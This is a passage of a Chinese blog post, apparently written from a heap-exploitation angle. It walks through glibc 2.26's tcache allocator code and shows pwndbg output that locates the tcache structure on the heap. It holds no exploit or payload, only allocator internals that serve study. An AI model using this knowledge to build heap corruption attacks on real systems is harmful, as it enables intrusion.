class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn't enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现tcache是一个指针，而内存块居然是用_int_malloc生成的，这就是说我们可以不管这个线程局部变量，直接去找这块内存就好了。</p><p>继续跟踪函数调用，过程是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc</span><br><span class="line">__libc_malloc</span><br><span class="line">          MAYBE_INIT_TCACHE</span><br><span class="line">              tcache_init</span><br></pre></td></tr></table></figure><p>而MAYBE_INIT_TCACHE的位置在arena_get之前，并且tcache_init中还包含arena_get函数。结合上一篇对于内存堆分配区的知识，这就可以判断，在对线程的分配区初始化之后，第一个分配的内存就是tcache内存块。</p><p>在主分配区该结构是heap段第一块内存，在非主分配应该在sub_heap和thread_state结构体以后</p><p>因此首先用<strong>vmmap</strong> 找到heap地址之后，就可以查看该结构体内容了，进而可以继续调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555555554000     0x555555555000 r-xp     1000 0      /home/p4nda/Desktop/1</span><br><span class="line">    0x555555754000     0x555555755000 r--p     1000 0      /home/p4nda/Desktop/1</span><br><span class="line">    0x555555755000     0x555555756000 rw-p     1000 1000   /home/p4nda/Desktop/1</span><br><span class="line">    0x555555756000     0x555555777000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff79f5000     0x7ffff7bcb000 r-xp   1d6000 0      /lib/x86_64-linux-gnu/libc-2.26.so</span><br><span class="line">    0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so</span><br><span class="line">    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1d6000 /lib/x86_64-linux-gnu/libc-2.26.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1da000 /lib/x86_64-linux-gnu/libc-2.26.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.26.so</span><br><span class="line">    0x7ffff7fe0000     0x7ffff7fe2000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.26.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.26.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line">pwndbg&gt; p *(struct tcache_perthread_struct *)0x555555756000</span><br><span class="line">$1 = &#123;</span><br><span class="line">  counts = &quot;\000\000\000\000\000\000\000\000Q\002&quot;, &apos;\000&apos; &lt;repeats 53 times&gt;, </span><br><span class="line">  entries = &#123;0x0 &lt;repeats 64 times&gt;&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h1 id="堆分配差异"><a href="#堆分配差异" class="headerlink" title="堆分配差异"></a>堆分配差异</h1><p>当加入了tcache机制后，原来的ptmalloc的堆块释放与分配机制存在一定的改变，先看两个函数tcache_get、tcache_put，可以看出这两个函数与fastbin的取出和插入基本完全一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存块放入tcache"><a href="#内存块放入tcache" class="headerlink" title="内存块放入tcache"></a>内存块放入tcache</h2><h3 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h3><p>可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by "design" from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内存申请"><a href="#内存申请" class="headerlink" title="内存申请"></a>内存申请</h3><p>在内存分配的malloc函数中有多处，会将内存块移入tcache中。</p><p>首先，申请的内存块符合fastbin大小时并且找到在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。</p><p>其次，申请的内存块符合smallbin大小时并且找到在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。</p><p>还有，当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。</p><p>（<strong>高能预警：代码经过剪切，仍然很长… </strong>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">... 变量定义 ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">...</span><br><span class="line">=======  <span class="number">1.</span>  申请块符合fastbin块大小  ========</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">=======  <span class="number">2.</span>  申请块符合smallbin块大小  ========</span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">====== 循环处理unsorted bin内存块 ========</span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">......   </span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">......</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存块从tcache中取出"><a href="#内存块从tcache中取出" class="headerlink" title="内存块从tcache中取出"></a>内存块从tcache中取出</h2><h3 id="直接分配"><a href="#直接分配" class="headerlink" title="直接分配"></a>直接分配</h3><p>在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes = request2size (bytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span 